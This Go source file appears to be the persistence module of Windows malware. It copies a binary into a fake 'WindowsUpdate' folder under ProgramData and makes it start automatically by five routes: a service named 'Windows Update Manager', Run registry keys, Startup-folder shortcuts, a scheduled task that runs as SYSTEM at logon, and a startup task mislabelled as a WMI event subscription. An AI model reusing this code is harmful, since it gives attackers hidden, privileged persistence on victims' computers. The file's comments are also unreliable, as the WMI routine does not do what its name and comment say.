package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

// InstallWindows, applies all persistence methods for Windows
func InstallWindows(binaryPath, serviceName string) error {
	var successCount int

	// Try all techniques
	if err := InstallWindowsService(binaryPath, serviceName); err == nil {
		successCount++
	}

	if err := InstallWindowsRegistry(binaryPath, serviceName); err == nil {
		successCount++
	}

	if err := InstallWindowsStartup(binaryPath); err == nil {
		successCount++
	}

	if err := InstallWindowsScheduledTask(binaryPath, serviceName); err == nil {
		successCount++
	}

	if err := InstallWindowsWMI(binaryPath, serviceName); err == nil {
		successCount++
	}

	if successCount > 0 {
		return nil
	}

	return fmt.Errorf("no Windows persistence method was successful")
}

// InstallWindowsService, installs a Windows service
func InstallWindowsService(binaryPath, serviceName string) error {
	// Copy file for service
	servicePath := filepath.Join(os.Getenv("PROGRAMDATA"), "WindowsUpdate", serviceName+".exe")
	if err := copyFile(binaryPath, servicePath); err != nil {
		return err
	}

	// Create service with SC command
	cmd := exec.Command("sc", "create", serviceName, "binPath=", servicePath, "start=", "auto", "DisplayName=", "Windows Update Manager")
	if err := cmd.Run(); err != nil {
		return err
	}

	fmt.Println("Windows service installation successful")
	return nil
}

// InstallWindowsRegistry, adds Windows registry entries
func InstallWindowsRegistry(binaryPath, serviceName string) error {
	// Copy file
	destPath := filepath.Join(os.Getenv("PROGRAMDATA"), "WindowsUpdate", serviceName+".exe")
	if err := copyFile(binaryPath, destPath); err != nil {
		return err
	}

	// Registry paths
	registryPaths := []string{
		"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
	}

	var successCount int
	for _, regPath := range registryPaths {
		cmd := exec.Command("reg", "add", regPath, "/v", serviceName, "/t", "REG_SZ", "/d", destPath, "/f")
		if err := cmd.Run(); err == nil {
			fmt.Printf("Registry entry successful: %s\n", regPath)
			successCount++
		}
	}

	if successCount > 0 {
		return nil
	}

	return fmt.Errorf("registry entries could not be added")
}

// InstallWindowsStartup, adds a shortcut to the Windows startup folder
func InstallWindowsStartup(binaryPath string) error {
	// Copy file
	destPath := filepath.Join(os.Getenv("PROGRAMDATA"), "WindowsUpdate", "WinUpdate.exe")
	if err := copyFile(binaryPath, destPath); err != nil {
		return err
	}

	// Startup folders
	startupPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
		filepath.Join(os.Getenv("PROGRAMDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
	}

	var successCount int
	for _, startupPath := range startupPaths {
		startupFile := filepath.Join(startupPath, "WindowsUpdate.lnk")

		// Create shortcut
		cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("%s"); $Shortcut.TargetPath = "%s"; $Shortcut.Save()`, startupFile, destPath))
		if err := cmd.Run(); err == nil {
			fmt.Printf("Shortcut added to startup folder: %s\n", startupFile)
			successCount++
		}
	}

	if successCount > 0 {
		return nil
	}

	return fmt.Errorf("shortcut could not be added to the startup folder")
}

// InstallWindowsScheduledTask, creates a Windows scheduled task
func InstallWindowsScheduledTask(binaryPath, taskName string) error {
	// Copy file
	destPath := filepath.Join(os.Getenv("PROGRAMDATA"), "WindowsUpdate", "WinUpdate.exe")
	if err := copyFile(binaryPath, destPath); err != nil {
		return err
	}

	// Create scheduled task
	taskCmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", destPath, "/sc", "onlogon", "/ru", "SYSTEM", "/f")
	if err := taskCmd.Run(); err != nil {
		return err
	}

	fmt.Println("Scheduled task created")
	return nil
}

// InstallWindowsWMI, creates a Windows WMI Event Subscription
func InstallWindowsWMI(binaryPath, eventName string) error {
	// Copy file
	destPath := filepath.Join(os.Getenv("PROGRAMDATA"), "WindowsUpdate", "WinUpdate.exe")
	if err := copyFile(binaryPath, destPath); err != nil {
		return err
	}

	// WMI Event Subscription
	wmiCmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$action = New-ScheduledTaskAction -Execute '%s'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName '%s' -Action $action -Trigger $trigger -RunLevel Highest -Force`, destPath, eventName))
	if err := wmiCmd.Run(); err != nil {
		return err
	}

	fmt.Println("WMI Event Subscription created")
	return nil
}
